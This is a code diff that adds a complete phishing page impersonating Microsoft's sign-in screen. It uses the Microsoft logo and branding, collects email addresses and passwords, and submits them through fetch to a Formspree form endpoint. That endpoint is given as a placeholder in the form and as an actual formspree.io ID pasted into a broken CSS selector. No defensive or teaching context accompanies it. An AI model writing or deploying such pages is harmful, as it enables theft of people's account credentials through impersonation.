@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Microsoft Sign In - Secure Login</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f3f3f3;
+    color: #222;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+  }
+  .container {
+    background: white;
+    max-width: 400px;
+    width: 100%;
+    border-radius: 10px;
+    box-shadow: 0 8px 24px rgba(0,0,0,0.15);
+    padding: 40px 32px 32px;
+  }
+  header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 30px;
+  }
+  header img {
+    width: 32px;
+    height: 32px;
+    margin-right: 14px;
+    user-select: none;
+  }
+  header h1 {
+    font-weight: 700;
+    font-size: 1.6rem;
+    color: #0078d7;
+    margin: 0;
+    user-select: none;
+  }
+  form {
+    display: flex;
+    flex-direction: column;
+  }
+  label {
+    font-weight: 600;
+    margin-bottom: 6px;
+    user-select: none;
+    color: #333;
+  }
+  form[action="https://formspree.io/f/xovdkvnz" method="POST"],
+  input[type="email"],
+  input[type="password"],
+  input[type="text"] {
+    padding: 14px 12px;
+    font-size: 1rem;
+    border: 1.8px solid #0078d7;
+    border-radius: 6px;
+    margin-bottom: 16px;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    outline-offset: 0;
+    transition: border-color 0.3s ease, box-shadow 0.3s ease;
+   [/form]
+  }
+  input[type="email"]:focus,
+  input[type="password"]:focus,
+  input[type="text"]:focus {
+    border-color: #005a9e;
+    box-shadow: 0 0 6px 1px rgba(0, 120, 215, 0.4);
+    outline: none;
+  }
+  input.invalid {
+    border-color: #d93025;
+  }
+  .error-message {
+    color: #d93025;
+    font-size: 0.85rem;
+    margin-top: -12px;
+    margin-bottom: 14px;
+    display: none;
+    user-select: none;
+  }
+  .captcha-container {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .captcha-container label {
+    min-width: 130px;
+    font-weight: 600;
+  }
+  button[type="submit"] {
+    padding: 14px 0;
+    font-size: 1.1rem;
+    font-weight: 700;
+    background-color: #0078d7;
+    border: none;
+    border-radius: 6px;
+    color: white;
+    cursor: pointer;
+    user-select: none;
+    transition: background-color 0.3s ease;
+  }
+  button[type="submit"]:hover,
+  button[type="submit"]:focus {
+    background-color: #005a9e;
+    outline: none;
+  }
+  .message {
+    margin-top: 20px;
+    font-weight: 600;
+    font-size: 1rem;
+    text-align: center;
+    user-select: none;
+  }
+  .message.success {
+    color: #0078d7;
+  }
+  .message.error {
+    color: #d93025;
+  }
+  /* Honeypot hidden */
+  .honeypot {
+    position: absolute !important;
+    left: -10000px !important;
+    top: auto !important;
+    width: 1px !important;
+    height: 1px !important;
+    overflow: hidden !important;
+  }
+  @media (max-width: 480px) {
+    .container {
+      padding: 28px 24px 24px;
+    }
+    header h1 {
+      font-size: 1.4rem;
+    }
+    button[type="submit"] {
+      font-size: 1rem;
+      padding: 12px 0;
+    }
+  }
+</style>
+</head>
+<body>
+
+<div class="container" role="main" aria-label="Microsoft sign in form">
+  <header>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/256px-Microsoft_logo.svg.png" alt="Microsoft logo" />
+    <h1>Microsoft Sign In</h1>
+  </header>
+
+  <form id="signInForm" action="YOUR_FORMSPREE_ENDPOINT" method="POST" novalidate autocomplete="off" aria-label="Sign in form with spam protection">
+    
+    <!-- Honeypot hidden field -->
+    <label class="honeypot" for="website">Website (leave blank)</label>
+    <input class="honeypot" type="text" id="website" name="website" tabindex="-1" autocomplete="off" />
+
+    <label for="email">Email address</label>
+    <input type="email" id="email" name="email" required aria-required="true" placeholder="email@example.com" />
+    <div id="emailError" class="error-message" aria-live="polite">Please enter a valid email address.</div>
+
+    <label for="password">Password</label>
+    <input type="password" id="password" name="password" minlength="6" required aria-required="true" placeholder="Enter your password" />
+    <div id="passwordError" class="error-message" aria-live="polite">Password must be at least 6 characters long.</div>
+
+    <div class="captcha-container">
+      <label for="captchaAnswer" id="captchaQuestion">What is 4 + 3?</label>
+      <input type="text" id="captchaAnswer" name="captchaAnswer" required aria-required="true" placeholder="Your answer" autocomplete="off" />
+    </div>
+    <div id="captchaError" class="error-message" aria-live="polite">Incorrect captcha answer.</div>
+
+    <button type="submit" aria-label="Sign in">Sign In</button>
+
+    <div id="formMessage" class="message" role="alert" aria-live="polite"></div>
+  </form>
+</div>
+
+<script>
+  (function(){
+    const form = document.getElementById('signInForm');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    const websiteInput = document.getElementById('website'); // honeypot
+    const captchaInput = document.getElementById('captchaAnswer');
+
+    const emailError = document.getElementById('emailError');
+    const passwordError = document.getElementById('passwordError');
+    const captchaError = document.getElementById('captchaError');
+    const formMessage = document.getElementById('formMessage');
+
+    const captchaAnswerCorrect = '7'; // 4 + 3 = 7
+
+    function validateEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    function clearErrors() {
+      emailError.style.display = 'none';
+      passwordError.style.display = 'none';
+      captchaError.style.display = 'none';
+      formMessage.textContent = '';
+      formMessage.className = 'message';
+      emailInput.classList.remove('invalid');
+      passwordInput.classList.remove('invalid');
+      captchaInput.classList.remove('invalid');
+    }
+
+    form.addEventListener('submit', function(e){
+      e.preventDefault();
+      clearErrors();
+
+      let valid = true;
+
+      // Honeypot must be blank
+      if(websiteInput.value.trim() !== ''){
+        formMessage.textContent = 'Spam submission detected.';
+        formMessage.classList.add('error');
+        return;
+      }
+
+      // Email validation
+      if(!validateEmail(emailInput.value.trim())){
+        emailError.style.display = 'block';
+        emailInput.classList.add('invalid');
+        valid = false;
+      }
+
+      // Password validation length >= 6
+      if(passwordInput.value.trim().length < 6){
+        passwordError.style.display = 'block';
+        passwordInput.classList.add('invalid');
+        valid = false;
+      }
+
+      // Captcha validation exact match
+      if(captchaInput.value.trim() !== captchaAnswerCorrect){
+        captchaError.style.display = 'block';
+        captchaInput.classList.add('invalid');
+        valid = false;
+      }
+
+      if (!valid) return;
+
+      // If all valid, submit form via fetch to Formspree for live email delivery
+      const formData = new FormData(form);
+      formMessage.textContent = 'Sending...';
+      formMessage.className = 'message';
+      
+      fetch(form.action, {
+        method: form.method,
+        body: formData,
+        headers: { 'Accept': 'application/json' },
+      })
+      .then(response => {
+        if (response.ok) {
+          formMessage.textContent = 'Thank you! Your details have been sent.';
+          formMessage.className = 'message success';
+          form.reset();
+        } else {
+          return response.json().then(data => {
+            if(data && data.errors){
+              formMessage.textContent = data.errors.map(e => e.message).join(', ');
+            } else {
+              formMessage.textContent = 'Oops! Something went wrong. Please try again.';
+            }
+            formMessage.className = 'message error';
+          });
+        }
+      })
+      .catch(() => {
+        formMessage.textContent = 'Oops! Network error. Please try again.';
+        formMessage.className = 'message error';
+      });
+    });
+  })();
+</script>
+
+</body>
+</html>
